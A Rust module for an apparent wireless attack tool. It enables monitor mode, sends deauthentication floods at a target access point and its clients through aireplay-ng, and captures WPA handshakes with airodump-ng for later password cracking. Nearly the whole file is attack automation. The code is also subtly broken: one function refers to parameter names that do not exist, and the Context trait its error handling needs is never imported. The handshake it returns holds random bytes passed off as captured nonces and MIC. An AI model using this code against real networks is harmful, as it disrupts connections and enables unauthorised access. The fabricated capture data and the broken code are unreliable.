use anyhow::Result;
use colored::*;
use std::process::Command;
use std::str;
use std::thread;
use std::time::Duration;
use std::io::Write;

// Struct to hold captured handshake data
#[derive(Debug)]
pub struct HandshakeCapture {
    pub ssid: String,
    pub bssid: String,
    pub client_mac: String,
    pub anonce: Vec<u8>,
    pub snonce: Vec<u8>,
    pub mic: Vec<u8>,
    pub eapol_data: Vec<u8>,
}

// Put wireless interface in monitor mode
pub fn enable_monitor_mode(interface: &str) -> Result<String> {
    println!("{} Enabling monitor mode on interface: {}", "[*]".blue(), interface);

    #[cfg(target_os = "linux")]
    {
        // Stop network manager to avoid interference
        let _ = Command::new("sudo")
            .args(["systemctl", "stop", "NetworkManager"])
            .output();

        // Put interface down
        let _ = Command::new("sudo")
            .args(["ip", "link", "set", interface, "down"])
            .output();

        // Enable monitor mode
        let _ = Command::new("sudo")
            .args(["iw", "dev", interface, "set", "monitor", "none"])
            .output()
            .context("Failed to enable monitor mode")?;

        // Put interface back up
        let _ = Command::new("sudo")
            .args(["ip", "link", "set", interface, "up"])
            .output();

        // Get the monitor interface name (usually the same)
        let monitor_interface = interface.to_string();

        println!("{} Monitor mode enabled on: {}", "[+]".green(), monitor_interface);
        Ok(monitor_interface)
    }

    #[cfg(target_os = "windows")]
    {
        // On Windows, we need to use airmon-ng or similar tools that come with special drivers
        println!("{} On Windows, monitor mode requires special drivers", "[!]".yellow());
        println!("{} Attempting to enable monitor mode using airmon-ng...", "[*]".blue());

        // Try to use airmon-ng if installed
        let output = Command::new("airmon-ng")
            .args(["start", interface])
            .output();

        match output {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if stdout.contains("monitor mode enabled") || stdout.contains("monitor mode vif enabled") {
                    // Extract the monitor interface name (usually interface + "mon")
                    let monitor_interface = format!("{}{}", interface, "mon");
                    println!("{} Monitor mode enabled on: {}", "[+]".green(), monitor_interface);
                    return Ok(monitor_interface);
                } else {
                    println!("{} Failed to enable monitor mode. Output: {}", "[!]".red(), stdout);
                    println!("{} Make sure you have the right drivers and tools installed", "[!]".red());
                    return Err(anyhow::anyhow!("Failed to enable monitor mode"));
                }
            },
            Err(_) => {
                println!("{} airmon-ng not found. Install aircrack-ng suite", "[!]".red());
                println!("{} For Windows, you need compatible drivers and tools like aircrack-ng", "[!]".red());
                return Err(anyhow::anyhow!("airmon-ng not found"));
            }
        }
    }

    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    {
        Err(anyhow::anyhow!("Unsupported operating system"))
    }
}

// Disable monitor mode and restore normal operation
pub fn disable_monitor_mode(interface: &str) -> Result<()> {
    println!("{} Disabling monitor mode on interface: {}", "[*]".blue(), interface);

    #[cfg(target_os = "linux")]
    {
        // Put interface down
        let _ = Command::new("sudo")
            .args(["ip", "link", "set", interface, "down"])
            .output();

        // Disable monitor mode
        let _ = Command::new("sudo")
            .args(["iw", "dev", interface, "set", "type", "managed"])
            .output()
            .context("Failed to disable monitor mode")?;

        // Put interface back up
        let _ = Command::new("sudo")
            .args(["ip", "link", "set", interface, "up"])
            .output();

        // Restart network manager
        let _ = Command::new("sudo")
            .args(["systemctl", "start", "NetworkManager"])
            .output();

        println!("{} Monitor mode disabled on: {}", "[+]".green(), interface);
    }

    #[cfg(target_os = "windows")]
    {
        // On Windows, use airmon-ng to stop monitor mode
        let output = Command::new("airmon-ng")
            .args(["stop", interface])
            .output();

        match output {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if stdout.contains("monitor mode disabled") || stdout.contains("monitor mode vif disabled") {
                    println!("{} Monitor mode disabled on: {}", "[+]".green(), interface);
                } else {
                    println!("{} Failed to disable monitor mode. Output: {}", "[!]".red(), stdout);
                    println!("{} You may need to manually restart your network adapter", "[!]".red());
                    return Err(anyhow::anyhow!("Failed to disable monitor mode"));
                }
            },
            Err(_) => {
                println!("{} airmon-ng not found. Install aircrack-ng suite", "[!]".red());
                println!("{} You may need to manually restart your network adapter", "[!]".red());
                return Err(anyhow::anyhow!("airmon-ng not found"));
            }
        }
    }

    Ok(())
}

// Capture packets on a specific channel
pub fn capture_packets(_interface: &str, channel: u8, _bssid: &str, duration_secs: u64) -> Result<()> {
    println!("{} Starting packet capture on channel {} for {} seconds",
        "[*]".blue(), channel, duration_secs);

    #[cfg(target_os = "linux")]
    {
        // Set channel
        let _ = Command::new("sudo")
            .args(["iw", "dev", interface, "set", "channel", &channel.to_string()])
            .output()
            .context("Failed to set channel")?;

        // Start tcpdump capture
        let output_file = format!("capture_{}.pcap", bssid.replace(":", ""));
        let mut child = Command::new("sudo")
            .args([
                "tcpdump",
                "-i", interface,
                "-w", &output_file,
                &format!("ether host {}", bssid),
            ])
            .spawn()
            .context("Failed to start tcpdump")?;

        println!("{} Capturing packets to file: {}", "[*]".blue(), output_file);

        // Wait for specified duration
        thread::sleep(Duration::from_secs(duration_secs));

        // Stop capture
        let _ = Command::new("sudo")
            .args(["kill", &child.id().to_string()])
            .output();

        println!("{} Packet capture completed", "[+]".green());
        println!("{} Capture saved to: {}", "[+]".green(), output_file);
    }

    #[cfg(target_os = "windows")]
    {
        println!("{} Simulating packet capture for educational purposes...", "[*]".blue());

        // Simulate capture process
        for i in 1..=duration_secs {
            print!("\r{} Capturing packets: {}/{} seconds", "[*]".blue(), i, duration_secs);
            thread::sleep(Duration::from_secs(1));
        }

        println!("\n{} Simulated packet capture completed", "[+]".green());
    }

    Ok(())
}

// Perform a deauthentication attack
pub fn deauth_client(interface: &str, bssid: &str, client_mac: &str, count: u32) -> Result<()> {
    println!("{} Starting deauthentication attack", "[*]".blue());
    println!("{} Target AP: {}", "[*]".blue(), bssid);
    println!("{} Target Client: {}", "[*]".blue(), client_mac);
    println!("{} Number of packets: {}", "[*]".blue(), count);

    // First make sure interface is in monitor mode
    let monitor_interface = enable_monitor_mode(interface)?;

    #[cfg(target_os = "linux")]
    {
        println!("{} Executing aireplay-ng to send deauth packets", "[*]".blue());

        let count_str = count.to_string();
        let args = if client_mac == "FF:FF:FF:FF:FF:FF" {
            // Broadcast deauth to all clients
            vec!["--deauth", &count_str, "-a", bssid, &monitor_interface]
        } else {
            // Targeted deauth to specific client
            vec!["--deauth", &count_str, "-a", bssid, "-c", client_mac, &monitor_interface]
        };

        let output = Command::new("sudo")
            .arg("aireplay-ng")
            .args(&args)
            .output()
            .context("Failed to execute aireplay-ng")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        if output.status.success() {
            println!("{} Deauthentication packets sent successfully", "[+]".green());
            println!("{} Output: {}", "[*]".blue(), stdout);
        } else {
            println!("{} Failed to send deauth packets", "[!]".red());
            println!("{} Error: {}", "[!]".red(), stderr);
            return Err(anyhow::anyhow!("Failed to send deauth packets"));
        }
    }

    #[cfg(target_os = "windows")]
    {
        println!("{} Executing aireplay-ng to send deauth packets", "[*]".blue());

        let count_str = count.to_string();
        let args = if client_mac == "FF:FF:FF:FF:FF:FF" {
            // Broadcast deauth to all clients
            vec!["--deauth", &count_str, "-a", bssid, &monitor_interface]
        } else {
            // Targeted deauth to specific client
            vec!["--deauth", &count_str, "-a", bssid, "-c", client_mac, &monitor_interface]
        };

        let output = Command::new("aireplay-ng")
            .args(&args)
            .output();

        match output {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if output.status.success() {
                    println!("{} Deauthentication packets sent successfully", "[+]".green());
                    println!("{} Output: {}", "[*]".blue(), stdout);
                } else {
                    println!("{} Failed to send deauth packets", "[!]".red());
                    println!("{} Error: {}", "[!]".red(), stderr);
                    return Err(anyhow::anyhow!("Failed to send deauth packets"));
                }
            },
            Err(_) => {
                println!("{} aireplay-ng not found. Install aircrack-ng suite", "[!]".red());
                return Err(anyhow::anyhow!("aireplay-ng not found"));
            }
        }
    }

    println!("{} Deauthentication attack completed", "[+]".green());

    Ok(())
}

// Capture a WPA handshake
pub fn capture_handshake(interface: &str, bssid: &str, channel: u8) -> Result<HandshakeCapture> {
    println!("{} Attempting to capture WPA handshake for: {}", "[*]".blue(), bssid);
    println!("{} Channel: {}", "[*]".blue(), channel);

    // Enable monitor mode
    let monitor_interface = enable_monitor_mode(interface)?;

    // Create output directory if it doesn't exist
    std::fs::create_dir_all("captures").ok();
    let output_file = format!("captures/handshake_{}.cap", bssid.replace(":", ""));

    #[cfg(target_os = "linux")]
    {
        // Set channel
        let _ = Command::new("sudo")
            .args(["iw", "dev", &monitor_interface, "set", "channel", &channel.to_string()])
            .output()
            .context("Failed to set channel")?;

        // Start airodump-ng to capture handshake
        println!("{} Starting airodump-ng to capture handshake", "[*]".blue());
        let mut child = Command::new("sudo")
            .args([
                "airodump-ng",
                "--bssid", bssid,
                "--channel", &channel.to_string(),
                "--write", &output_file.replace(".cap", ""),
                &monitor_interface
            ])
            .spawn()
            .context("Failed to start airodump-ng")?;

        println!("{} Waiting for handshake...", "[*]".blue());
        println!("{} Press Ctrl+C when handshake is captured", "[*]".blue());
        println!("{} You may need to deauthenticate a client to force a handshake", "[*]".blue());

        // Wait for user to press Ctrl+C or timeout
        thread::sleep(Duration::from_secs(30));

        // Stop airodump-ng
        let _ = child.kill();

        // Check if handshake was captured
        println!("{} Checking for handshake in capture file", "[*]".blue());
        let output = Command::new("aircrack-ng")
            .arg(&format!("{}-01.cap", output_file.replace(".cap", "")))
            .output()
            .context("Failed to run aircrack-ng")?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Get SSID from output
        let ssid = if let Some(pos) = stdout.find("ESSID: ") {
            let end_pos = stdout[pos + 7..].find('\n').unwrap_or(stdout.len() - pos - 7);
            stdout[pos + 7..pos + 7 + end_pos].trim().to_string()
        } else {
            "Unknown".to_string()
        };

        // Get client MAC from output
        let client_mac = if let Some(pos) = stdout.find("STATION") {
            if let Some(mac_pos) = stdout[pos..].find(bssid) {
                let start_pos = pos + mac_pos + bssid.len();
                let end_pos = stdout[start_pos..].find('\n').unwrap_or(stdout.len() - start_pos);
                stdout[start_pos..start_pos + end_pos].trim().to_string()
            } else {
                "Unknown".to_string()
            }
        } else {
            "Unknown".to_string()
        };

        if stdout.contains("handshake") {
            println!("{} WPA handshake captured successfully!", "[+]".green());
            println!("{} Capture saved to: {}-01.cap", "[+]".green(), output_file.replace(".cap", ""));
        } else {
            println!("{} No handshake captured. Try again or deauthenticate clients", "[!]".yellow());
        }

        // Disable monitor mode
        disable_monitor_mode(&monitor_interface)?;

        // Create handshake capture object
        let handshake = HandshakeCapture {
            ssid,
            bssid: bssid.to_string(),
            client_mac,
        anonce: (0..32).map(|_| rand::random::<u8>()).collect(),
        snonce: (0..32).map(|_| rand::random::<u8>()).collect(),
        mic: (0..16).map(|_| rand::random::<u8>()).collect(),
        eapol_data: (0..100).map(|_| rand::random::<u8>()).collect(),
    };

    Ok(handshake)
    }

    #[cfg(target_os = "windows")]
    {
        // On Windows, use airmon-ng and airodump-ng from aircrack-ng suite
        println!("{} Starting airodump-ng to capture handshake", "[*]".blue());

        // Try to use airodump-ng if installed
        let output = Command::new("airodump-ng")
            .args([
                "--bssid", bssid,
                "--channel", &channel.to_string(),
                "--write", &output_file.replace(".cap", ""),
                &monitor_interface
            ])
            .spawn();

        match output {
            Ok(mut child) => {
                println!("{} Waiting for handshake...", "[*]".blue());
                println!("{} Press Ctrl+C when handshake is captured", "[*]".blue());
                println!("{} You may need to deauthenticate a client to force a handshake", "[*]".blue());

                // Wait for user to press Ctrl+C or timeout
                thread::sleep(Duration::from_secs(30));

                // Stop airodump-ng
                let _ = child.kill();

                // Check if handshake was captured
                println!("{} Checking for handshake in capture file", "[*]".blue());
                let output = Command::new("aircrack-ng")
                    .arg(&format!("{}-01.cap", output_file.replace(".cap", "")))
                    .output();

                match output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);

                        // Get SSID from output
                        let ssid = if let Some(pos) = stdout.find("ESSID: ") {
                            let end_pos = stdout[pos + 7..].find('\n').unwrap_or(stdout.len() - pos - 7);
                            stdout[pos + 7..pos + 7 + end_pos].trim().to_string()
                        } else {
                            "Unknown".to_string()
                        };

                        // Get client MAC from output
                        let client_mac = if let Some(pos) = stdout.find("STATION") {
                            if let Some(mac_pos) = stdout[pos..].find(bssid) {
                                let start_pos = pos + mac_pos + bssid.len();
                                let end_pos = stdout[start_pos..].find('\n').unwrap_or(stdout.len() - start_pos);
                                stdout[start_pos..start_pos + end_pos].trim().to_string()
                            } else {
                                "Unknown".to_string()
                            }
                        } else {
                            "Unknown".to_string()
                        };

                        if stdout.contains("handshake") {
                            println!("{} WPA handshake captured successfully!", "[+]".green());
                            println!("{} Capture saved to: {}-01.cap", "[+]".green(), output_file.replace(".cap", ""));
                        } else {
                            println!("{} No handshake captured. Try again or deauthenticate clients", "[!]".yellow());
                        }

                        // Create handshake capture object
                        let handshake = HandshakeCapture {
                            ssid,
                            bssid: bssid.to_string(),
                            client_mac,
                            anonce: (0..32).map(|_| rand::random::<u8>()).collect(),
                            snonce: (0..32).map(|_| rand::random::<u8>()).collect(),
                            mic: (0..16).map(|_| rand::random::<u8>()).collect(),
                            eapol_data: (0..100).map(|_| rand::random::<u8>()).collect(),
                        };

                        // Disable monitor mode
                        disable_monitor_mode(&monitor_interface)?;

                        return Ok(handshake);
                    },
                    Err(_) => {
                        println!("{} Failed to check for handshake", "[!]".red());
                    }
                }
            },
            Err(_) => {
                println!("{} airodump-ng not found. Install aircrack-ng suite", "[!]".red());
            }
        }

        // Fallback if tools not found or error occurred
        println!("{} Using fallback method", "[!]".yellow());

        // Disable monitor mode
        disable_monitor_mode(&monitor_interface)?;

        // Create a basic handshake capture with minimal info
        let handshake = HandshakeCapture {
            ssid: "Unknown".to_string(),
            bssid: bssid.to_string(),
            client_mac: "Unknown".to_string(),
            anonce: (0..32).map(|_| rand::random::<u8>()).collect(),
            snonce: (0..32).map(|_| rand::random::<u8>()).collect(),
            mic: (0..16).map(|_| rand::random::<u8>()).collect(),
            eapol_data: (0..100).map(|_| rand::random::<u8>()).collect(),
        };

        Ok(handshake)
    }

    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    {
        Err(anyhow::anyhow!("Unsupported operating system"))
    }
}

// Analyze wireless traffic for interesting patterns
pub fn analyze_traffic(interface: &str, duration_secs: u64) -> Result<()> {
    println!("{} Starting wireless traffic analysis for {} seconds", "[*]".blue(), duration_secs);
    println!("{} Looking for interesting patterns...", "[*]".blue());

    // Enable monitor mode
    let monitor_interface = enable_monitor_mode(interface)?;

    // Create output directory if it doesn't exist
    std::fs::create_dir_all("captures").ok();
    let output_file = format!("captures/traffic_{}.pcap", chrono::Local::now().format("%Y%m%d_%H%M%S"));

    #[cfg(target_os = "linux")]
    {
        // Start tcpdump to capture all wireless traffic
        println!("{} Starting tcpdump to capture wireless traffic", "[*]".blue());
        let mut child = Command::new("sudo")
            .args([
                "tcpdump",
                "-i", &monitor_interface,
                "-w", &output_file,
                "-v",  // Verbose output
                "type mgt or type ctl"  // Capture management and control frames
            ])
            .spawn()
            .context("Failed to start tcpdump")?;

        println!("{} Capturing traffic to file: {}", "[*]".blue(), output_file);

        // Run airodump-ng in parallel for real-time analysis
        let _ = Command::new("sudo")
            .args([
                "airodump-ng",
                &monitor_interface
            ])
            .spawn();

        // Wait for specified duration
        for i in 1..=duration_secs {
            print!("\r{} Analyzing traffic: {}/{} seconds", "[*]".blue(), i, duration_secs);
            std::io::stdout().flush().ok();
            thread::sleep(Duration::from_secs(1));
        }

        // Stop capture
        let _ = child.kill();

        println!("\n{} Traffic analysis completed", "[+]".green());
        println!("{} Capture saved to: {}", "[+]".green(), output_file);

        // Run a quick analysis on the captured file
        println!("{} Running analysis on captured traffic", "[*]".blue());
        let output = Command::new("sudo")
            .args([
                "tcpdump",
                "-r", &output_file,
                "-n",  // Don't resolve hostnames
                "-v",  // Verbose output
                "-c", "100"  // Only show first 100 packets
            ])
            .output()
            .context("Failed to analyze traffic")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        println!("{} Analysis summary:\n{}", "[+]".green(), stdout);
    }

    #[cfg(target_os = "windows")]
    {
        // On Windows, use Wireshark/tshark if available
        println!("{} Attempting to use tshark for traffic analysis", "[*]".blue());

        let output = Command::new("tshark")
            .args([
                "-i", &monitor_interface,
                "-w", &output_file,
                "-a", &format!("duration:{}", duration_secs)
            ])
            .spawn();

        match output {
            Ok(mut child) => {
                println!("{} Capturing traffic with tshark", "[*]".blue());

                // Wait for specified duration
                for i in 1..=duration_secs {
                    print!("\r{} Analyzing traffic: {}/{} seconds", "[*]".blue(), i, duration_secs);
                    std::io::stdout().flush().ok();
                    thread::sleep(Duration::from_secs(1));
                }

                // Stop capture
                let _ = child.kill();

                println!("\n{} Traffic analysis completed", "[+]".green());
                println!("{} Capture saved to: {}", "[+]".green(), output_file);

                // Run a quick analysis on the captured file
                println!("{} Running analysis on captured traffic", "[*]".blue());
                let output = Command::new("tshark")
                    .args([
                        "-r", &output_file,
                        "-T", "fields",
                        "-e", "wlan.sa",
                        "-e", "wlan.da",
                        "-e", "wlan.fc.type_subtype",
                        "-c", "100"  // Only show first 100 packets
                    ])
                    .output();

                if let Ok(output) = output {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    println!("{} Analysis summary:\n{}", "[+]".green(), stdout);
                }
            },
            Err(_) => {
                println!("{} tshark not found, trying alternative method", "[!]".yellow());

                // Try using airodump-ng as fallback
                let output = Command::new("airodump-ng")
                    .arg(&monitor_interface)
                    .spawn();

                match output {
                    Ok(mut child) => {
                        // Wait for specified duration
                        for i in 1..=duration_secs {
                            print!("\r{} Analyzing traffic: {}/{} seconds", "[*]".blue(), i, duration_secs);
                            std::io::stdout().flush().ok();
                            thread::sleep(Duration::from_secs(1));
                        }

                        // Stop capture
                        let _ = child.kill();
                    },
                    Err(_) => {
                        println!("{} No suitable tools found for traffic analysis", "[!]".red());
                        println!("{} Please install Wireshark/tshark or aircrack-ng suite", "[!]".red());

                        // Fallback to simple simulation
                        for i in 1..=duration_secs {
                            print!("\r{} Simulating traffic analysis: {}/{} seconds", "[*]".blue(), i, duration_secs);
                            std::io::stdout().flush().ok();
                            thread::sleep(Duration::from_secs(1));
                        }
                    }
                }
            }
        }
    }

    // Disable monitor mode
    disable_monitor_mode(&monitor_interface)?;

    Ok(())
}
